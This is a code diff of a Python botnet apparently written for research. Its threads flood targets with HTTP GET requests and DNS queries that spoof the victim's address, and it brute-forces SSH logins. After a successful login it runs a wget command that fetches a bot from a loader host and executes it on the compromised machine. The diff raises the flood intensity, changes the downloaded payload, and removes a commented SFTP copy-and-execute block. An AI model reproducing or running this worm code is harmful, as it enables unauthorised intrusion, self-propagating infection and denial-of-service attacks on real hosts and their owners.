@@ -105,8 +105,7 @@ def int_handler(sig, frame):
 
 # Kill ssh processes. 
 def kill_processes():
-    # kill dropbear ssh. Replace with other version.
-    os.system("kill -9 `ps ax | grep dropbear | grep -v grep | awk '{ print $1}'`")
+    # SSH is not killed in init bot.
     if os.path.isfile(LOCK_FILE):
         sys.exit("Already Running.")
     else:
@@ -128,12 +127,12 @@ class attack(Thread):
         if self._type == 0:
             connection = http.client.HTTPConnection(self._ip, port=self._port)
             headers = {'Content-type': 'application/json'}
-            for i in range(randint(10,20)):
+            for i in range(randint(20,40)):
                 connection.request("GET", self.get_random_string(7), headers=headers)
                 _ = connection.getresponse()
             connection.close()
         elif self._type == 1:
-            for i in range(randint(10,20)):
+            for i in range(randint(20,40)):
                 l_qname = 'somedomain.com'
                 dns_req = IP(src=self._ip, dst=OUR_DNS)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=l_qname))
                 _ = sr1(dns_req, timeout=1, verbose=0)
@@ -152,20 +151,13 @@ class ssh_login(Thread):
         global OPEN_IPS
         s = paramiko.SSHClient()
         s.load_system_host_keys()
-        s.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+        s.set_missing_host_key_policy(paramiko.WarningPolicy)
 
         try:
-            s.connect(self._ip, 22, self._uname, self._pwd, timeout=2, auth_timeout=2)
-
-            """
-            # Copy malware locally and execute.
-            sftp = paramiko.SFTPClient.from_transport(s)
-            sftp.put('/tmp/bot.py', '/tmp/bot.py')
-            stdin, stdout, stderr = s.exec_command("python3 /tmp/bot.py &")
-            """
+            s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
 
             # Download malware from loader and execute.
-            cmd = "wget -O /tmp/bot.py {}:{}/bot.py;python3 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
+            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py;python3 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
             sin, sout, serr = s.exec_command(cmd)
             sout.channel.recv_exit_status()
             print('Login successful using {} {} {}.'.format(self._ip, self._uname, self._pwd))
@@ -178,8 +170,10 @@ class ssh_login(Thread):
             with LOCK:
                 del OPEN_IPS[self._ip]
             print('Port closed for IP: {}. Deleting'.format(self._ip))
-        except:
+        except paramiko.ssh_exception.AuthenticationException:
             pass
+        except:
+            print(sys.exc_info())
             #print('Login Failed.')
         finally:
             s.close()
